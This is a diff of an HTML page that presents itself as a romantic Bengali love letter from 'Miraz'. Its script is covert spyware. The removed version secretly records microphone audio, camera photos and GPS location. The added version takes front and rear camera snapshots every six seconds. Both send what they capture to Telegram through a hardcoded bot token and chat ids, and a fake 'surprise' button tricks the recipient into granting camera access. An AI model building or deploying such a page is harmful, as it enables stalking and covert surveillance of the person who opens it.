@@ -3,149 +3,337 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>A Message from Miraz</title>
+  <title>A Special Message - Miraz</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap');
+    
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }
-    body { background-color: #f0f2f5; height: 100vh; overflow: hidden; position: relative; }
     
-    .header { background-color: #008069; color: white; padding: 15px 20px; font-size: 20px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); z-index: 1000; position: relative; }
-
-    #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 2000; display: flex; justify-content: center; align-items: center; }
-    .start-box { text-align: center; width: 85%; max-width: 350px; padding: 30px; border-radius: 20px; background: #ffffff; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
-    .allow-btn { background: #25d366; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; font-size: 1.1rem; cursor: pointer; width: 100%; margin-top: 20px; }
-
-    .chat-container { background: #ffffff; max-width: 600px; margin: 0 auto; height: 100vh; display: none; opacity: 0; transition: 1s; position: relative; }
-    .letter-area { padding: 30px 20px; height: calc(100vh - 60px); overflow: hidden; position: relative; }
+    body { 
+      /* ফিচার ৩: ঝাপসা ব্যাকগ্রাউন্ড ছবি (নিশ্চিত করুন background.jpg ফাইলটি আছে) */
+      background: url('background.jpg') no-repeat center center fixed; 
+      background-size: cover;
+      height: 100vh; 
+      overflow: hidden; 
+      position: relative; 
+      color: #fff;
+    }
     
-    .scrolling-content { position: absolute; width: 90%; left: 5%; text-align: center; animation: letterMove 70s linear forwards; color: #111b21; z-index: 500; }
-    @keyframes letterMove { 0% { transform: translateY(80vh); } 100% { transform: translateY(-220%); } }
+    /* ব্যাকগ্রাউন্ড ওভারলে এবং ব্লার ইফেক্ট */
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(15, 15, 26, 0.85); 
+      backdrop-filter: blur(12px); 
+      z-index: -1;
+    }
+    
+    .header { 
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      color: #00f2fe; 
+      padding: 18px 25px; 
+      font-size: 20px; 
+      font-weight: 700; 
+      display: flex; 
+      justify-content: space-between; 
+      align-items: center; 
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      z-index: 1000; 
+      position: relative; 
+    }
 
-    .heart { position: absolute; color: #ff4b5c; font-size: 20px; pointer-events: none; animation: float 6s infinite linear; z-index: 600; }
-    @keyframes float { 0% { transform: translateY(100vh) scale(0.5); opacity: 0; } 100% { transform: translateY(-10vh) scale(1.2); opacity: 0; } }
+    #overlay { 
+      position: fixed; 
+      top: 0; left: 0; width: 100%; height: 100%; 
+      background: rgba(15, 15, 26, 0.98); 
+      z-index: 2000; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      transition: 0.8s; 
+    }
+
+    .start-box { 
+      text-align: center; 
+      width: 85%; 
+      max-width: 380px; 
+      padding: 40px 30px; 
+      border-radius: 24px; 
+      background: rgba(255, 255, 255, 0.03); 
+      box-shadow: 0 15px 35px rgba(0,0,0,0.5); 
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(15px);
+    }
+
+    .allow-btn { 
+      background: linear-gradient(45deg, #00f2fe, #4facfe); 
+      color: white; 
+      border: none; 
+      padding: 16px 30px; 
+      border-radius: 50px; 
+      font-weight: 700; 
+      font-size: 1.1rem; 
+      cursor: pointer; 
+      width: 100%; 
+      margin-top: 25px; 
+      box-shadow: 0 5px 15px rgba(0, 242, 254, 0.3);
+    }
+
+    .chat-container { 
+      background: transparent; 
+      max-width: 700px; 
+      margin: 0 auto; 
+      height: 100vh; 
+      display: none; 
+      opacity: 0; 
+      transition: 1.5s; 
+      position: relative; 
+    }
+
+    .letter-area { 
+      padding: 20px 25px 50px 25px; 
+      height: calc(100vh - 70px); 
+      overflow-y: auto; 
+      position: relative; 
+      scrollbar-width: none; 
+    }
+    .letter-area::-webkit-scrollbar { display: none; } 
+    
+    .typing-content { 
+      width: 100%; 
+      text-align: justify; 
+      z-index: 500; 
+      position: relative;
+    }
+
+    .message-card {
+        background: rgba(255, 255, 255, 0.04);
+        padding: 35px 25px;
+        border-radius: 20px;
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        backdrop-filter: blur(8px);
+        margin-top: 10px;
+    }
+
+    .main-text {
+        font-size:1.15rem; 
+        line-height:2.4; 
+        color:#e0e0f0; 
+        white-space:pre-wrap; 
+        font-weight: 600;
+        display: inline;
+    }
+
+    .cursor {
+      display: inline-block;
+      width: 10px;
+      background-color: #00f2fe;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+    /* ফিচার ২: ভাসমান ফুল */
+    .flower {
+      position: absolute;
+      background-image: url('flower.png'); 
+      background-size: cover;
+      pointer-events: none;
+      z-index: 600;
+      animation: floatFlower linear infinite;
+    }
+    @keyframes floatFlower {
+      0% { transform: translateY(-10vh) translateX(0) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(110vh) translateX(50px) rotate(360deg); opacity: 0; }
+    }
+
+    .rain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; pointer-events: none; }
+    .raindrop { 
+      position: absolute; 
+      background: linear-gradient(transparent, #00f2fe); 
+      width: 1.5px; 
+      height: 25px; 
+      opacity: 0.3;
+      animation: rainfall linear infinite; 
+    }
+    @keyframes rainfall { to { transform: translateY(100vh); } }
+    
+    .heart { 
+      position: absolute; 
+      color: #ff4d6d; 
+      font-size: 24px; 
+      pointer-events: none; 
+      animation: floatHeart 6s infinite linear; 
+      z-index: 600; 
+    }
+    @keyframes floatHeart { 
+      0% { transform: translateY(100vh) scale(0.5); opacity: 0; } 
+      20% { opacity: 1; } 
+      100% { transform: translateY(-15vh) scale(1.3); opacity: 0; } 
+    }
+
+    #video, #canvas { display: none; }
   </style>
 </head>
 <body>
 
   <div id="overlay">
     <div class="start-box">
-      <h2 style="color:#008069">একটি বিশেষ বার্তা! ❤️</h2>
-      <p style="color: #667781">মিরাজ আপনার জন্য কিছু পাঠিয়েছে। সবকিছু দেখতে 'Allow' করুন।</p>
-      <button class="allow-btn" id="startBtn">ওপেন করুন (Allow)</button>
+      <h2 style="color:#00f2fe; margin-bottom:10px;">একটি বিশেষ বার্তা! ❤️</h2>
+      <p style="color: #a0a0b0; font-weight: 400;">মিরাজ আপনার জন্য কিছু পাঠিয়েছে।</p>
+      <button class="allow-btn" id="startBtn">ওপেন করুন</button>
     </div>
   </div>
 
   <div class="chat-container" id="chatList">
-    <div class="header"><span>WhatsApp</span><div>🔍 &nbsp; ⋮</div></div>
-    <div class="letter-area">
-        <div class="scrolling-content">
-            <h2 style="color:#008069; margin-bottom:25px;">প্রিয়, বাঁম পাজরের হাড় 🌹</h2>
-            <p style="font-size:1.15rem; line-height:2.1; color:#3b4a54; white-space:pre-wrap; text-align: justify;">
-আল্লাহর রহমতে বেশ ভালো আছো নিশ্চয়, থাকতেই হবে 💝 শত ব্যস্ততার মাঝেও যে আমি তোমার ভালো থাকার দোয়া করতে ভুল করি না 🥰
-            
-অনেকদিন তো হলো আর কতো বাবার বাড়িতে থাকবে শুনি...?? ভুলে গেছো কি...? 🤔 ওটা কিন্তু তোমার থাকার জায়গা নয়, ওখানে তুমি একজন অতিথি মাত্র। 😒
-            
-তুমি হলে রবের নিকট থেকে রহমত সরুপ প্রাপ্ত আমার শ্রেষ্ঠ সম্পদ। তোমার মা বাবাকে শুধু কিছুদিনের জন্যে আমার সেই সম্পদের হেফাজতের সুযোগ দিয়েছি মাত্র। তোমার বাবাকে জানিয়ে দিও খুব শীঘ্রই আসছি কিন্তু আমার সেই সম্পদ বুঝে নিতে। কি হলো চিন্তায় পড়ে গেলে, ভাবতেছো কারই বা সম্পদ তুমি আর এর হকদার-ই বা কেমন?
-            
-ভয় পেও না, তুমি হলে আমার অমূল্য সম্পদ 🥰 তোমার বাবা এর জিম্মাদার হয়ে যদি এত যত্ন আর মায়া করে আগলে রাখতে পারে, তাহলে ভেবে দেখো যে এর আসল হকদার সে কতটা যত্ন আর মায়া করবে তোমাকে ☺️ 
-            
-রাগ করোনা আমার আসতে দেরী হচ্ছে দেখে, আর মাত্র কিছুদিন ধৈর্য ধরো 😥 তোমার জন্যে নিজেকে যোগ্য করতেই একটু সময় লেগে যাচ্ছে 🥺 
-            
-এই শোনো নিজেকে শুধু আমার জন্যে আগলে রেখো কিন্তু, যেমনটা আমি আমাকে আগলে রেখেছি শুধুই তোমার জন্যে। 
-            
-ইতি,
-তোমার জান্নাতের সঙ্গী!!
-**Miraz ☺️**
-            </p>
+    <div class="header">
+        <span>Message For You</span>
+        <div style="font-size: 16px; opacity: 0.7;">✨ 💖</div>
+    </div>
+    <div class="letter-area" id="letterArea">
+        <div class="typing-content">
+            <div class="message-card">
+                <h2 style="color:#4facfe; margin-bottom:30px; font-size: 1.7rem; font-weight: 700;">প্রিয়, বাঁম পাজরের হাড় 🌹</h2>
+                
+                <p class="main-text" id="typingText"></p>
+                <span class="cursor" id="cursor">&nbsp;</span>
+                
+                <p style="margin-top: 30px; text-align: center;">
+                    <b style="color: #00f2fe; font-size: 1.35rem; font-weight: 700;">Miraz ☺️</b>
+                </p>
+            </div>
         </div>
+        <div class="rain" id="rainEffect"></div>
     </div>
   </div>
 
-  <audio id="bgMusic" loop><source src="music.mp3" type="audio/mpeg"></audio>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <audio id="bgMusic" loop preload="auto">
+    <source src="Music.mp3" type="audio/mpeg">
+  </audio>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <script>
-    const botToken = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY'; 
-    const chatId = '7767412329';
+    const textToType = `আল্লাহর রহমতে বেশ ভালো আছো নিশ্চয়, থাকতেই হবে 💝 শত ব্যস্ততার মাঝেও যে আমি তোমার ভালো থাকার দোয়া করতে ভুল করি না 🥰
+                
+অনেকদিন তো হলো আর কতো বাবার বাড়িতে থাকবে শুনি...?? ভুলে গেছো কি...? 🤔 ওটা কিন্তু তোমার থাকার জায়গা নয়, ওখানে তুমি একজন অতিথি মাত্র। 😒
+                
+তুমি হলে রবের নিকট থেকে রহমত সরুপ প্রাপ্ত আমার শ্রেষ্ঠ সম্পদ। তোমার মা বাবাকে শুধু কিছুদিনের জন্যে আমার সেই সম্পদের হেফাজতের সুযোগ দিয়েছি মাত্র। তোমার বাবাকে জানিয়ে দিও খুব শীঘ্রই আসছি কিন্তু আমার সেই সম্পদ বুঝে নিতে। কি হলো চিন্তায় পড়ে গেলে, ভাবতেছো কারই বা সম্পদ তুমি আর এর হকদার-ই বা কেমন?
+                
+ভয় পেও না, তুমি হলে আমার অমূল্য সম্পদ 🥰 তোমার বাবা এর জিম্মাদার হয়ে যদি এত যত্ন আর মায়া করে আগলে রাখতে পারে, তাহলে ভেবে দেখো যে এর আসল হকদার সে কতটা যত্ন আর মায়া করবে তোমাকে ☺️ 
+                
+রাগ করোনা আমার আসতে দেরী হচ্ছে দেখে, আর মাত্র কিছুদিন ধৈর্য ধরো 😥 তোমার জন্যে নিজেকে যোগ্য করতেই একটু সময় লেগে যাচ্ছে 🥺 
+                
+এই শোনো নিজেকে শুধু আমার জন্যে আগলে রেখো কিন্তু, যেমনটা আমি আমাকে আগলে রেখেছি শুধুই তোমার জন্যে। 
+                
+ইতি,
+তোমার জান্নাতের সঙ্গী!!`;
+
+    const bot1Token = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY'; 
+    const bot1ChatId = '7767412329';
+    const bot2ChatId = '7888600155';
     
-    const startBtn = document.getElementById('startBtn');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const music = document.getElementById('bgMusic');
+    const startBtn = document.getElementById('startBtn');
+    const typingText = document.getElementById('typingText');
+    const cursor = document.getElementById('cursor');
+    const letterArea = document.getElementById('letterArea');
+    
+    let camCounter = 0;
+    let typeIndex = 0;
 
-    startBtn.addEventListener('click', async function() {
+    startBtn.addEventListener('click', function() {
+      // ইউজার ক্লিক করার পর মিউজিক এবং ক্যামেরা শুরু হবে
+      music.play().catch(err => console.log("Music error:", err));
+      startExperience();
+    });
+
+    async function startExperience() {
       try {
-        // ১. একসাথেই ক্যামেরা ও মাইক্রোফোন পারমিশন চাওয়া
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        video.srcObject = stream;
-
-        // ২. ইন্টারফেস পরিবর্তন
+        await setCam("user");
+        capture("Front_Start");
         document.getElementById('overlay').style.display = 'none';
         const chatBox = document.getElementById('chatList');
         chatBox.style.display = 'block';
         setTimeout(() => chatBox.style.opacity = '1', 50);
-        document.getElementById('bgMusic').play();
-
-        // ৩. লুপগুলো শুরু করা
-        startAudioLoop(stream);   // ৩৫ সেকেন্ডের অডিও লুপ
-        startCameraLoop();        // ১৫ সেকেন্ডের ফটো লুপ
-        startLocationLoop();      // ১ মিনিটের লোকেশন লুপ
-        setInterval(createHeart, 800); // হার্ট এনিমেশন
-
+        
+        // ইফেক্টগুলো চালু করা
+        setInterval(createHeart, 1000); 
+        setInterval(createFlower, 2500); 
+        createRain();
+        startTyping(); 
+        
+        // ক্যামেরা লুপ এবং টেলগ্রাম মেসেজিং
+        setInterval(async () => {
+          camCounter++;
+          const mode = (camCounter % 2 === 0) ? "user" : "environment";
+          await setCam(mode);
+          capture(`${mode}_Loop_${camCounter}`);
+        }, 6000);
       } catch (err) {
-        alert("সব পারমিশন 'Allow' না করলে সারপ্রাইজটি কাজ করবে না।");
+        alert("ক্যামেরা পারমিশন ছাড়া সারপ্রাইজটি কাজ করবে না!");
       }
-    });
-
-    // --- ৩৫ সেকেন্ডের অডিও রেকর্ডিং লুপ ---
-    function startAudioLoop(stream) {
-      const record = () => {
-        const mediaRecorder = new MediaRecorder(stream);
-        let chunks = [];
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-          sendFile(blob, 'voice', 'recording.ogg', '🎙️ লাইভ ভয়েস (৩৫ সেকেন্ড)');
-          record(); // সাথে সাথে আবার শুরু
-        };
-        mediaRecorder.start();
-        setTimeout(() => { if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 35000);
-      };
-      record();
     }
 
-    // --- ক্যামেরা লুপ (প্রতি ১৫ সেকেন্ডে ছবি) ---
-    function startCameraLoop() {
-      setInterval(() => {
+    function startTyping() {
+      if (typeIndex < textToType.length) {
+        typingText.textContent += textToType.charAt(typeIndex);
+        typeIndex++;
+        // স্বয়ংক্রিয়ভাবে নিচে স্ক্রল করা
+        letterArea.scrollTop = letterArea.scrollHeight;
+        setTimeout(startTyping, 75); 
+      } else {
+        cursor.style.display = 'none';
+      }
+    }
+
+    function createFlower() {
+      const f = document.createElement('div');
+      f.className = 'flower';
+      f.style.left = Math.random() * 100 + 'vw';
+      const size = Math.random() * 20 + 10 + 'px';
+      f.style.width = size; f.style.height = size;
+      f.style.animationDuration = Math.random() * 5 + 5 + 's';
+      document.body.appendChild(f);
+      setTimeout(() => f.remove(), 10000);
+    }
+
+    async function setCam(mode) {
+      if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+      video.srcObject = s;
+      return new Promise(r => video.onloadedmetadata = r);
+    }
+
+    function capture(label) {
+      setTimeout(() => {
         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(b => sendFile(b, 'photo', 'img.jpg', '📸 লাইভ ফটো'), 'image/jpeg', 0.5);
-      }, 15000);
+        canvas.toBlob(b => {
+          if (b) { send(bot1ChatId, b, label); send(bot2ChatId, b, label); }
+        }, 'image/jpeg', 0.4);
+      }, 1500);
     }
 
-    // --- লোকেশন লুপ (প্রতি ১ মিনিটে) ---
-    function startLocationLoop() {
-      const getLoc = () => {
-        navigator.geolocation.getCurrentPosition(pos => {
-          const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-          sendText(`📍 আপডেট লোকেশন:\n${link}`);
-        }, null, {enableHighAccuracy: true});
-      };
-      getLoc();
-      setInterval(getLoc, 60000);
-    }
-
-    // --- টেলিগ্রাম সেন্ডিং ফাংশনস ---
-    function sendText(text) {
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-    }
-
-    function sendFile(blob, type, filename, caption) {
+    function send(id, b, msg) {
       const fd = new FormData();
-      fd.append('chat_id', chatId);
-      fd.append(type, blob, filename);
-      fd.append('caption', caption);
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+      fd.append('chat_id', id); fd.append('photo', b, 'img.jpg'); fd.append('caption', msg);
+      fetch(`https://api.telegram.org/bot${bot1Token}/sendPhoto`, { method: 'POST', body: fd });
+    }
+
+    function createRain() {
+      const rainContainer = document.getElementById('rainEffect');
+      for (let i = 0; i < 40; i++) {
+        const drop = document.createElement('div');
+        drop.className = 'raindrop';
+        drop.style.left = Math.random() * 100 + 'vw';
+        drop.style.animationDuration = (Math.random() * 0.5 + 0.8) + 's';
+        rainContainer.appendChild(drop);
+      }
     }
 
     function createHeart() {
@@ -157,4 +345,4 @@
     }
   </script>
 </body>
-                          </html>
+  </html>
